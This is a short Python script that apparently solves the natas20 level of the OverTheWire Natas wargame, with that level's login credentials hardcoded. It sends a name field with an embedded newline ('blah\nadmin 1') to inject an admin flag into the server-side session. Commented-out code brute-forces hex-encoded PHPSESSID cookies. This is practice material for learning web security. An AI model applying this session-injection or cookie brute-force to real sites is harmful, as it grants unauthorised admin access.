#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/?debug=true' %username

session = requests.Session()

response = session.get(url, auth = (username, password) )
print response.text
print "="*80

response = session.post(url, data={"name": "blah\nadmin 1"}, auth = (username, password) )
print response.text
print "="*80

response = session.get(url, auth = (username, password) )
print response.text
print "="*80



#for session_id in range (1,641):
#
##response = session.post(url, data = {"username" : "natas20", "password": "blah"}, auth = (username, password))
	#print {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}
	#response = session.get(url, cookies = {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}, auth = (username, password) )
	#content = response.text
##
	#if ( "You are an admin" in content ):
		#print "Got it!", session_id
		##print content
		#break
	
		#print "trying", session_id
	#rint content	
	#print session.cookies["PHPSESSID"].decode('hex')
#print "======================================================="
#print content
